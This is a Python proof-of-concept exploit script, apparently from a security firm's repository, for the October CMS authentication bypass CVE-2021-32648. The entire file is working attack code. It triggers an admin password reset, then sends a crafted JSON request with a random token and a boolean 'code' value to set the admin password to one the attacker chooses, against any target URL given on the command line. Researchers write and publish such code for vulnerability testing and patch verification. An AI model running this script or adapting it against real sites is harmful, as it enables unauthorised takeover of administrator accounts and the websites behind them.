# Copyright (C) 2022 Kev Breen, Immersive Labs
# https://github.com/Immersive-Labs-Sec/CVE-2021-32648
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import argparse
import random
import re
import requests
import string

reset_path = '/backend/backend/auth/restore'
password_path = '/backend/backend/auth/reset/1'

session = requests.session()

def randStr(chars = string.ascii_uppercase + string.digits + string.ascii_lowercase, N=42):
    """Generate a random string of len 42 to spoof a reset token"""
    return ''.join(random.choice(chars) for _ in range(N))

def get_csrf(target_host):
    """Connect to Host and read the CSRF token so we can use it in POSTS"""
    csrf_pattern = b'<meta name="csrf-token" content="(.*?)">'
    csrf_request = session.get(f'{target_host}{reset_path}')
    if csrf_request.status_code == 200:
        csrf_token = re.search(csrf_pattern, csrf_request.content).group(1)
    return csrf_token.decode()


def version_check():
    """Check Version number to see if exploitable before sending reset request"""
    return True

def trigger_reset(target_host):
    """Trigger a Password Reset Request for the admin account"""
    reset_url = f'{target_host}{reset_path}'
    csrf_token = get_csrf(target_host)
    post_data = {
        '_token': csrf_token,
        'postback': 1,
        'login': 'admin'
    }
    reset_request = session.post(reset_url, data=post_data)
    if reset_request.status_code == 200:
        return True

def set_password(target_host, target_password):
    "Send a request to set the admin password that will bypass the token checking"
    reset_url = f'{target_host}{password_path}/{randStr()}'
    csrf_token = get_csrf(target_host)
    post_data = {
        '_token': csrf_token,
        'postback': 1,
        'id': 1,
        'code': True,
        'password': target_password
    }
    headers = {'Content-Type': 'application/json'}
    reset_request = session.post(reset_url, headers=headers, json=post_data)
    if reset_request.status_code == 200:
        return True


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Auth Bypass for October CMS')
    parser.add_argument(
        '--target',
        help='Target Host e.g. https://targedomain.com',
        required=True)

    parser.add_argument(
        '--password',
        help='The New Password you want to set for the admin account',
        required=True)

    args = parser.parse_args()

    try:
        print(f'[+] Attempting to set password on {args.target}')
        print('  [-] requesting Password Reset, Admin account will be notified"')
        trigger_reset(args.target)
        print(f'  [-] Setting new password for admin account to "{args.password}"')
        set_password(args.target, args.password)
        print('[+] No errors if target was vulnerable password has been set.')
    except Exception as err:
        print('[!] There was an error making one or more requests')
